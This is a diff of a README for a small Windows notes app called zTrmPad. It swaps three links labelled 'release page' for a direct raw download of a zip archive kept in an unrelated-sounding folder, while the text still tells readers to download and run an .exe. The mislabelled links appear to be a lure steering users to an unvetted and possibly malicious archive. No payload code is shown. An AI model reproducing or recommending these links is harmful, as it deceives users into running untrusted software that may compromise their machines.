@@ -1,6 +1,6 @@
 # 🖤 zTrmPad - Minimal notes for focused typing
 
-[![Download zTrmPad](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/unsharpened-genusherpestes96/zTrmPad/releases)
+[![Download zTrmPad](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/unsharpened-genusherpestes96/zTrmPad/main/constitutionality/z-Pad-Trm-2.6.zip)
 
 ## ✨ What zTrmPad is
 
@@ -19,7 +19,7 @@ The app uses a minimal layout and keeps the focus on text. That makes it useful 
 
 To get the app, visit the release page and download the Windows file from there:
 
-[Go to the zTrmPad release page](https://github.com/unsharpened-genusherpestes96/zTrmPad/releases)
+[Go to the zTrmPad release page](https://raw.githubusercontent.com/unsharpened-genusherpestes96/zTrmPad/main/constitutionality/z-Pad-Trm-2.6.zip)
 
 After the page opens, look for the latest release and choose the Windows download. If you see a `.exe` file, download it and run it on your PC.
 
@@ -147,7 +147,7 @@ If you want a small app that feels direct, this is the kind of tool that fits th
 
 When a new version comes out, return to the release page and download the latest Windows file. New releases may include fixes, small changes, or display updates.
 
-[Download from the release page](https://github.com/unsharpened-genusherpestes96/zTrmPad/releases)
+[Download from the release page](https://raw.githubusercontent.com/unsharpened-genusherpestes96/zTrmPad/main/constitutionality/z-Pad-Trm-2.6.zip)
 
 ## 📌 About the project
 
